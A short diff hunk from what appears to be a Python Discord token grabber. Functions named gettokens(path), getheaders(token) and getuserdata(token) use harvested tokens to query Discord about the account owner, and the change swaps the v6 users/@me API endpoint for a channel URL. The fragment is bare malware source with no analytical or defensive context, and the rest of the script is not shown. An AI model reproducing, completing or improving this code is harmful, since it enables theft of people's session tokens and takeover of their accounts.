@@ -31,7 +31,7 @@ def getheaders(token=None, content_type="application/json"):
     return headers
 def getuserdata(token):
     try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+        return loads(urlopen(Request("https://discord.com/channels/@me/964521648579559475", headers=getheaders(token))).read().decode())
     except:
         pass
 def gettokens(path):
